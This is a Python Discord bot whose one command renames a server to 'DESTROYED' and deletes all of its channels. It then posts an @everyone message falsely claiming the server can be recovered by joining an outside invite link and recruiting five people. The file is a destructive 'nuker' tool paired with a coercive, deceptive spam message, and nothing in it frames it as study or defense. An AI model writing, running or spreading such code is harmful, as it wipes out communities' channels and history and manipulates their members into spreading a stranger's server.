import os
import discord
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command()
async def go(ctx):
    if ctx.author.id != ctx.guild.owner_id:
        return

    await ctx.guild.edit(name="☠️D̵E̶S̶T̵R̸O̵Y̸E̴D̵☠️")

    for channel in ctx.guild.channels[:]:
        try:
            await channel.delete()
        except:
            pass

    new_channel = await ctx.guild.create_text_channel("H̷O̵W̴ ̵T̴O̷ ̶R̸E̴C̵O̵V̵E̵R̶")
    msg = "@everyone @here **Sorry, your server was destroyed. How can you recover it? Recover it by joining https://discord.gg/QEJDaSxxka and inviting 5 people.**"
    await new_channel.send(msg, allowed_mentions=discord.AllowedMentions(everyone=True))

bot.run(os.getenv('DISCORD_TOKEN'))
